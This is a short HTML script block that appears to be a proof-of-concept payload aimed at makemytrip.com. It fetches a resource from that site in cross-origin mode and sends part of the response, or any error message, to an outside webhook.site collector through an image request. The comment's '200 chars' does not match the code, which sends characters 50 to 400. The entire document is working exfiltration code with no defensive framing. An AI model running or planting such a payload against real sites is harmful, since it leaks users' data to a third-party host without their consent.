<script>
fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zwwq2WCIpNr/default/public-bundle.css/", {
  method: "GET",
  mode: "cors"
})
.then(res => res.text())
.then(body => {
  // send first 200 chars (encoded) via image src
  const i = new Image();
  i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=" + encodeURIComponent(body.slice(50, 400));
})
.catch(err => {
  const i = new Image();
  i.src = "https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=" + encodeURIComponent(err.message);
});
</script>
